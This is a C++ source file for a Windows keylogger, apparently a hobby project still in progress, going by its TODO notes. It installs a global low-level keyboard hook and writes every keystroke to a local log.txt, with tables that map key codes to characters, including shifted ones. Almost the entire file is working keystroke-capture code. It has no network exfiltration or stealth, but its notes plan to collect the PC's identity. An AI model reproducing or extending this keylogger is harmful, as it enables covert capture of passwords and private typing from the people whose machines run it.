#define UNICODE
#include <winsock2.h>
#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
using namespace std;


/*

Simple Key Logger

implement shift keys (check tomorrow to test valdiity)
make a repository on github, commit then fork this over
possibly implement other features? like grabbing pc id
tune some logging to make sure data is readable


implement funciton keys

think about removing some values from the map

implement use of virtual keyboard layout, refer to github example
    --currently prints out int representation of letters, fix it

*/

HHOOK _hook = NULL;
std::ofstream logFile;
void startLogging();
void computerInformation();
LRESULT CALLBACK hookCallBack(int nCode, WPARAM wParam, LPARAM lParam);
HKL getKeyboardLayout();
void protoLog();
LRESULT CALLBACK protoHookCallBack(int nCode, WPARAM wParam, LPARAM lParam);

map<int, string> keyname {
   
    {VK_BACK, "[BACKSPACE]" },
	{VK_RETURN,	"[ENTER]\n" },
	{VK_SPACE,	" "},
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
    {VK_DELETE, "[DELETE]"},
	{VK_CAPITAL,	"[CAPSLOCK]" },
    {VK_OEM_PLUS, "="},
    {VK_OEM_MINUS, "-"},
    {VK_OEM_PERIOD, "."},
    {VK_OEM_COMMA, ","},
    {0x41, "a"},
    {0x42, "b"},
    {0x43, "c"},
    {0x44, "d"},
    {0x45, "e"},
    {0x46, "f"},
    {0x47, "g"},
    {0x48, "h"},
    {0x49, "i"},
    {0x4A, "j"},
    {0x4B, "k"},
    {0x4C, "l"},
    {0x4D, "m"},
    {0x4E, "n"},
    {0x4F, "o"},
    {0x50, "p"},
    {0x51, "q"},
    {0x52, "r"},
    {0x53, "s"},
    {0x54, "t"},
    {0x55, "u"},
    {0x56, "v"},
    {0x57, "w"},
    {0x58, "x"},
    {0x59, "y"},
    {0x5A, "z"},
    {0x30, "0"}, 
    {0x31, "1"}, 
    {0x32, "2"}, 
    {0x33, "3"}, 
    {0x34, "4"}, 
    {0x35, "5"}, 
    {0x36, "6"}, 
    {0x37, "7"}, 
    {0x38, "8"}, 
    {0x39, "9"}, 
    {VK_OEM_1, ";"},
    {VK_OEM_2, "/"},
    {VK_OEM_7, "'"},
    {VK_OEM_6, "]"},
    {VK_OEM_4, "["},
    {VK_OEM_5,  "\\"},
    {VK_F1, "[F1]"},
    {VK_F2, "[F2]"},
    {VK_F3, "[F3]"},
    {VK_F4, "[F4]"},
    {VK_F5, "[F5]"},
    {VK_F6, "[F6]"},
    {VK_F7, "[F7]"},
    {VK_F8, "[F8]"},
    {VK_F9, "[F9]"},
    {VK_F10, "[F10]"},
    {VK_F11, "[F11]"},
    {VK_F12, "[F12]"},

    
};

map<int, char> altKeyname { // for characters acheived through shift + xyz

// all values in altKeyname must exist in keyname 

    
    {VK_SPACE,	' '},
    {VK_OEM_PLUS, '+'},
    {VK_OEM_MINUS, '_'},
    {VK_OEM_2, '?'},
    {VK_OEM_PERIOD, '>'},
    {VK_OEM_COMMA, '<'},
    {VK_OEM_1, ':'},
    {VK_OEM_6, '}'},
    {VK_OEM_7, '"'},
    {VK_OEM_4, '{'},
    {VK_OEM_5, '|'},
    {0x30, ')'}, 
    {0x31, '!'},
    {0x32, '@'},
    {0x33, '#'}, 
    {0x34, '$'}, 
    {0x35, '%'}, 
    {0x36, '^'}, 
    {0x37, '&'}, 
    {0x38, '*'}, 
    {0x39, '('}, 
    {0x41, 'A'},
    {0x42, 'B'},
    {0x43, 'C'},
    {0x44, 'D'},
    {0x45, 'E'},
    {0x46, 'F'},
    {0x47, 'G'},
    {0x48, 'H'},
    {0x49, 'I'},
    {0x4A, 'J'},
    {0x4B, 'K'},
    {0x4C, 'L'},
    {0x4D, 'M'},
    {0x4E, 'N'},
    {0x4F, 'O'},
    {0x50, 'P'},
    {0x51, 'Q'},
    {0x52, 'R'},
    {0x53, 'S'},
    {0x54, 'T'},
    {0x55, 'U'},
    {0x56, 'V'},
    {0x57, 'W'},
    {0x58, 'X'},
    {0x59, 'Y'},
    {0x5A, 'Z'},

};

int main() {

    protoLog();
    return 0;
    /*
    startLogging();
    cout << "Logger closed." << endl; // maybe display log file path after?
    return 0;
    */

}

void protoLog() {
    ::logFile.open("log.txt", ios::app);  
    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, protoHookCallBack, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        ;
    }
    UnhookWindowsHookEx(_hook);
    ::logFile.close();  // Close the log file

    


}
LRESULT CALLBACK protoHookCallBack(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) {
        // do nothing
    } else {
        if (wParam == WM_KEYDOWN) {
            HKL layout = getKeyboardLayout();
            KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
            int code = kbdStruct->vkCode;
            char key;
            key = MapVirtualKeyExA(code, MAPVK_VK_TO_CHAR, layout);

            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {

                logFile << char(key);

            } else if (GetKeyState(VK_CAPITAL) & 0x0001) {
                logFile << char(key);
            } else {
                key = tolower(key);
                logFile << char(key);
            }

            
            ::logFile.flush();
        }
    }
    
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}


HKL getKeyboardLayout() {
    return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
}

LRESULT CALLBACK hookCallBack(int nCode, WPARAM wParam, LPARAM lParam) {

    if (nCode < 0) {
        // do nothing
    } else {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam; // kbd struct, holds event being caught
        int key = kbdStruct->vkCode;
        if (wParam == WM_KEYDOWN) {
            
            if (key == VK_ESCAPE) { // terminate message (remove later when gui made for start/stop button)
                ::logFile << "\n";
                PostQuitMessage(0);

            } else if (keyname.find(key) != keyname.end()) { // able to find a corresponding key in the keyname map 

                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) { // characters acheived through shift key

                    if (altKeyname.find(key) == altKeyname.end() || keyname.find(key) == keyname.end()) { // if you are holding down shift, but not pressing other letters after holding it down

                        ::logFile << "";

                    } else {
                        ::logFile << altKeyname.find(key)->second; // routes   
                    }
                    
                } else if (GetKeyState(VK_CAPITAL) & 0x0001) { // if caps lock toggled on 
                    
                    char c = keyname.find(key)->second[0];

                    
                    if (isalpha(c)) { // check if c is a alphabet letter
                        char upperCase = toupper(c);
                        ::logFile << upperCase; 
                    } else {
                        ::logFile << keyname.find(key)->second; 
                    }
                    
                    
                } else {
                    ::logFile << keyname.find(key)->second;
                    
                }
                
            } else {
                // enter here if key is == to an alphabet, no special symbols
                ::logFile << "[UNKNOWNINPUT]";
            }
        }
    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void startLogging() {
    cout << "Logging started." << endl;
    ::logFile.open("log.txt", ios::app);  
    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallBack, NULL, 0);
    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0)) {
        ;
    }
    UnhookWindowsHookEx(_hook);
    
    ::logFile.close();  // Close the log file
}

